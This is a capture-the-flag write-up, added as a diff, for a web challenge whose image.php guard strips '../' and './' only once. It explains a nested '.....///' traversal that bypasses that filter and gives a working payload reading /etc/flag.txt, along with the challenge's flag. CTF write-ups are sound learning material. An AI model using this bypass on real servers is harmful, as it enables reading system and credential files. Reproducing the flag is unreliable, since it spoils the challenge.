@@ -1,0 +1,30 @@
+# Shopping! Level 2 (Web / 250 pts)
+
+**Flag:** `TDHT{5640e184eecc1d886f8d3614e1254b0702f7}`
+
+---
+
+Same Northline Market store as L1 but with filtering on the LFI. The `image.php` endpoint still takes a `path` parameter but now has a guard function:
+
+```php
+function vuln_image_guard($path) {
+    if (!str_starts_with($path, '/var/www/html/')) return 'sneaky';
+    $path = str_replace('../', '', $path);
+    $path = str_replace('./', '', $path);
+    return $path;
+}
+```
+
+Two defenses: path must start with `/var/www/html/` and it strips `../` and `./` sequences. But `str_replace` in PHP is single-pass, not recursive. So you can nest characters that reform into `../` after both passes.
+
+Found the bypass by testing: `.....///` survives both replacements to become `../`:
+- Step 1 (`str_replace('../', '')`) turns `.....///` into `...//'` 
+- Step 2 (`str_replace('./', '')`) turns `...//' into `../`
+
+Final payload:
+
+```
+/image.php?path=/var/www/html/.....///.....///.....///etc/flag.txt
+```
+
+Resolves to `/var/www/html/../../../etc/flag.txt` → `/etc/flag.txt`. Got the source by reading `image.php` through itself (`path=/var/www/html/image.php`), which had a comment saying it'd help with next levels.
